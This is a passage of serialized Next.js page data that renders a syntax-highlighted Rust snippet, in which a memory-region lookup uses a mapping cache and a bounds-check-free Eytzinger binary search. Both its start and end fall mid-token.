rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[72]}]\n660:[\"$\",\"span\",\"code-segment-751\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n661:[\"$\",\"span\",\"code-segment-752\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// slow path, handle writes that span multiple memory regions\"]}]\n662:[\"$\",\"span\",\"code-segment-753\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n663:[\"$\",\"span\",\"line-number--73\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[73]}]\n664:[\"$\",\"span\",\"code-segment-755\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n665:[\"$\",\"span\",\"code-segment-756\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n666:[\"$\",\"span\",\"code-segment-757\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n667:[\"$\",\"span\",\"line-number--74\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[74]}]\n668:[\"$\",\"span\",\"code-segment-759\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n669:[\"$\",\"span\",\"code-segment-760\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n66a:[\"$\",\"span\",\"code-segment-761\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n66b:[\"$\",\"span\",\"line-number--75\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[75]}]\n66c:[\"$\",\"span\",\"code-segment-763\",{\"c"])</script><script>self.__next_f.push([1,"lassName\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n66d:[\"$\",\"span\",\"code-segment-764\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n66e:[\"$\",\"span\",\"code-segment-765\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n66f:[\"$\",\"span\",\"line-number--76\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[76]}]\n670:[\"$\",\"span\",\"code-segment-767\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n671:[\"$\",\"span\",\"code-segment-768\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n672:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n673:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache\"]}]\n674:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n675:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n676:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n677:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n678:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n679:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MappingCache\"]}]\n67a:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n67b:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n67c:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n67d:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n67e:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"s"])</script><script>self.__next_f.push([1,"tyle\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n67f:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n680:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n681:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\n682:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n683:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Option\"]}]\n684:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n685:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n686:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}]\n687:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n688:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n689:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n68a:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n68b:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n68c:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n68d:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n68e:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n68f:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n690:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"$u"])</script><script>self.__next_f.push([1,"ndefined\",\"style\":{},\"children\":[\" \"]}]\n691:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\n692:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n693:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index\"]}]\n694:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n695:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n696:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n697:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache\"]}]\n698:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n699:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find\"]}]\n69a:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n69b:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}]\n69c:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n69d:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n69e:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n69f:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6a0:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n6a1:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n6a2:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\""])</script><script>self.__next_f.push([1,"#ccc\"},\"children\":[\"...\"]}]\n6a3:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6a4:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n6a5:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n6a6:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n6a7:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6a8:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"else\"]}]\n6a9:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6aa:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n6ab:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6ac:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n6ad:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n6ae:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n6af:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6b0:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n6b1:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index \"]}]\n6b2:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n6"])</script><script>self.__next_f.push([1,"b3:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6b4:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\n6b5:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n6b6:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6b7:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n6b8:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n6b9:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// region_addresses is eytzinger ordered array of MemoryRegions, so we\"]}]\n6ba:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6bb:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n6bc:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n6bd:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// do a binary search here \"]}]\n6be:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6bf:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n6c0:[\"$\",\"span\",\"code-segm"])</script><script>self.__next_f.push([1,"ent-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n6c1:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"while\"]}]\n6c2:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index \"]}]\n6c3:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c=\"]}]\n6c4:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6c5:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n6c6:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n6c7:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region_addresses\"]}]\n6c8:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n6c9:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}]\n6ca:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n6cb:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n6cc:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6cd:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n6ce:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6cf:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n6d0:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n6d1:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":["])</script><script>self.__next_f.push([1,"\"// Safety:\"]}]\n6d2:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6d3:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n6d4:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n6d5:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// we start the search at index=1 and in the loop condition check\"]}]\n6d6:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6d7:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n6d8:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n6d9:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// for index \u003c= len, so bound checks can be avoided\"]}]\n6da:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6db:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n6dc:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                index \"]}]\n6dd:[\"$\",\"span\",\"code-segment-132\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n6de:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"$undef"])</script><script>self.__next_f.push([1,"ined\",\"style\":{},\"children\":[\" \"]}]\n6df:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n6e0:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index \"]}]\n6e1:[\"$\",\"span\",\"code-segment-136\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}]\n6e2:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6e3:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\n6e4:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n6e5:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6e6:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n6e7:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n6e8:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n6e9:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6ea:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\n6eb:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6ec:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n6ed:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6ee:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n6ef:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n6f0:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"token "])</script><script>self.__next_f.push([1,"token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n6f1:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region_addresses\"]}]\n6f2:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n6f3:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_unchecked\"]}]\n6f4:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n6f5:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index \"]}]\n6f6:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}]\n6f7:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6f8:[\"$\",\"span\",\"code-segment-159\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\n6f9:[\"$\",\"span\",\"code-segment-160\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n6fa:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n6fb:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c=\"]}]\n6fc:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr \"]}]\n6fd:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n6fe:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n6ff:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n700:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                        \"]}]\n701:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n702:[\"$\",\"s"])</script><script>self.__next_f.push([1,"pan\",\"code-segment-169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n703:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}]\n704:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n705:[\"$\",\"span\",\"code-segment-172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n706:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n707:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n708:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n709:[\"$\",\"span\",\"code-segment-176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n70a:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\n70b:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            index \"]}]\n70c:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e=\"]}]\n70d:[\"$\",\"span\",\"code-segment-180\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index\"]}]\n70e:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n70f:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"trailing_zeros\"]}]\n710:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n711:[\"$\",\"span\",\"code-segment-184\",{\"className\":\"token token\",\"style\":{\"color\":\""])</script><script>self.__next_f.push([1,"#ccc\"},\"children\":[\")\"]}]\n712:[\"$\",\"span\",\"code-segment-185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n713:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"token 